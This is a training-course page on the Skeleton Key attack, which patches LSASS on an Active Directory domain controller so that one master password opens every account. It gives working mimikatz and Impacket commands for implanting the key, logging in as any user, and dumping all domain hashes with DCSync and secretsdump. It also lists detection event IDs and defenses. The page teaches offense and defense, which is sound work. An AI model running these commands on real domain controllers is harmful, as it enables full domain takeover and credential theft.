# Skeleton Key Attack

## Unit 7 - Topic 3 | Persistence

---

## Overview

**Skeleton Key** is a persistence technique that patches the LSASS process on a Domain Controller to accept a master password for any domain account while keeping original passwords functional. It enables universal authentication bypass without modifying any AD objects.

---

## 1. How Skeleton Key Works

```
SKELETON KEY MECHANISM:

BEFORE (Normal):
┌──────┐   Authenticate: admin / RealPass123   ┌──────┐
│Client│ ────────────────────────────────────→ │  DC  │
│      │   ✅ Success (correct password)       │ LSASS│
│      │ ←──────────────────────────────────── │      │
│      │                                       │      │
│      │   Authenticate: admin / WrongPass     │      │
│      │ ────────────────────────────────────→ │      │
│      │   ❌ Failed (wrong password)          │      │
│      │ ←──────────────────────────────────── │      │
└──────┘                                       └──────┘

AFTER SKELETON KEY:
┌──────┐   Authenticate: admin / RealPass123   ┌──────┐
│Client│ ────────────────────────────────────→ │  DC  │
│      │   ✅ Success (original still works)   │ LSASS│
│      │ ←──────────────────────────────────── │ (patched)
│      │                                       │      │
│      │   Authenticate: admin / mimikatz      │      │
│      │ ────────────────────────────────────→ │      │
│      │   ✅ Success (skeleton key password!) │      │
│      │ ←──────────────────────────────────── │      │
│      │                                       │      │
│      │   ANY user / mimikatz → ✅ Success    │      │
└──────┘                                       └──────┘

KEY POINTS:
├── Patches LSASS in memory (not on disk)
├── Default skeleton password: "mimikatz"
├── All original passwords continue to work
├── Lost on DC reboot (memory-only)
├── Requires DA/SYSTEM on DC to install
└── Must be installed on EACH DC
```

---

## 2. Deploying Skeleton Key

```bash
# === MIMIKATZ (Standard Method) ===
# Must run ON the Domain Controller as Admin/SYSTEM

mimikatz# privilege::debug
mimikatz# misc::skeleton
# Output: "Skeleton Key implanted"

# Default password: mimikatz
# Now authenticate as ANY user with "mimikatz" password

# === TESTING ===
# From any machine, authenticate as any user:
net use \\dc01\c$ /user:corp\Administrator "mimikatz"
# ✅ Success!

runas /user:corp\ceo "cmd.exe"
# Enter password: mimikatz
# ✅ Success!

# PsExec:
psexec.py corp.local/Administrator:mimikatz@dc01

# === REMOTE DEPLOYMENT (Impacket) ===
# If you have DA credentials:
# 1. Upload mimikatz to DC
# 2. Execute remotely:
psexec.py corp.local/admin:pass@dc01 \
  "mimikatz.exe privilege::debug misc::skeleton exit"

# === SKELETON KEY WITH CREDENTIAL GUARD ===
# If Credential Guard is enabled:
# Standard skeleton key FAILS
# Alternative: misc::skeleton /patch
# Uses different patching technique
# May still fail on modern systems with VBS
```

---

## 3. Skeleton Key Limitations

```
LIMITATIONS:

1. MEMORY-ONLY:
   ├── Lost when DC reboots
   ├── Must re-deploy after every restart
   └── Not true persistent backdoor alone

2. SINGLE DC:
   ├── Only affects the DC where installed
   ├── Must install on ALL DCs for full coverage
   └── Auth to non-patched DC = skeleton key fails

3. DETECTION RISK:
   ├── LSASS is monitored by EDR/AV
   ├── Mimikatz signatures well-known
   ├── Memory analysis can detect patches
   └── Unusual LSASS behavior triggers alerts

4. CREDENTIAL GUARD:
   ├── Blocks standard skeleton key
   ├── LSASS runs in isolated process (LSAIso)
   └── Patching LSASS in VBS is much harder

5. NTLM ONLY:
   ├── Skeleton key works with NTLM auth
   ├── May not work with Kerberos pre-auth
   │   (depends on implementation)
   └── AES-only environments may be resistant

COMPARISON WITH ALTERNATIVES:
├── Golden Ticket: Survives reboots, offline generation
├── DCSync: One-time extraction, create tickets later
├── Skeleton Key: Convenient but temporary
└── Certificate: Survives everything, 1-2 year validity
```

---

## 4. Combining with Other Persistence

```bash
# === SKELETON KEY + GOLDEN TICKET ===
# Use skeleton key for immediate universal access
# Use Golden Ticket for long-term persistence after reboot

# Step 1: Install skeleton key for current session
misc::skeleton

# Step 2: While active, extract krbtgt for Golden Ticket
lsadump::dcsync /user:corp\krbtgt
# Save hash offline

# Step 3: If DC reboots (skeleton key lost):
# Forge Golden Ticket → re-access DC → re-install skeleton key

# === SKELETON KEY + DCSYNC ===
# Use skeleton key access to DCSync ALL hashes
# Even if DA password changes, skeleton key still works

# Via skeleton key auth:
secretsdump.py corp.local/anyuser:mimikatz@dc01 -just-dc

# Dump everything for offline use:
secretsdump.py corp.local/Administrator:mimikatz@dc01
```

---

## 5. Detection and Defense

```
DETECTING SKELETON KEY:

EVENT LOGS:
├── Event ID 7045: New service (if deployed via service)
├── Event ID 4673: Sensitive privilege use (SeDebugPrivilege)
├── Event ID 4611: Trusted logon process registered
└── System Event 3033/3063: Code integrity violation

MEMORY ANALYSIS:
├── Scan LSASS for mimikatz patterns
├── Look for patched functions in msv1_0.dll
├── Compare LSASS hash/integrity with known good
└── Volatility plugin: mimikatz_skeleton_key

BEHAVIORAL:
├── Test authentication with known bad password
│   (If succeeds → skeleton key present!)
├── Monitor for SeDebugPrivilege usage on DCs
├── Alert on mimikatz-related strings in memory
└── Watch for LSASS crashes (failed patching attempts)

DEFENSE:
├── Credential Guard (blocks LSASS patching)
├── Protected Process Light for LSASS
├── Sysmon + LSASS monitoring
├── Regular DC reboots (clears memory)
├── Restrict DA logon to DCs only
└── Anti-malware on DCs with memory scanning
```

| Defense | Effectiveness |
|---------|:------------:|
| **Credential Guard** | 🟢 Strong |
| **LSASS PPL** | 🟢 Strong |
| **EDR on DCs** | 🟡 Moderate |
| **Regular reboots** | 🟡 Moderate (clears but doesn't prevent) |
| **Event monitoring** | 🟡 Moderate |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Skeleton Key** | Master password for all domain accounts |
| **Default password** | "mimikatz" |
| **Persistence** | Memory-only (lost on reboot) |
| **Requirement** | DA/SYSTEM access on DC |
| **Scope** | Only the DC where installed |
| **Detection** | LSASS integrity, Event 4673, behavior |
| **Defense** | Credential Guard, LSASS PPL |

---

## Quick Revision Questions

1. **What does the Skeleton Key attack patch?**
2. **Why is Skeleton Key not considered true persistence?**
3. **What is the default Skeleton Key password?**
4. **How does Credential Guard prevent Skeleton Key?**
5. **How can you detect if a Skeleton Key is active?**

---

[← Previous: Golden Ticket Persistence](02-golden-ticket-persistence.md) | [Next: AdminSDHolder Abuse →](04-adminsdholder-abuse.md)

---

*Unit 7 - Topic 3 of 6 | [Back to README](../README.md)*
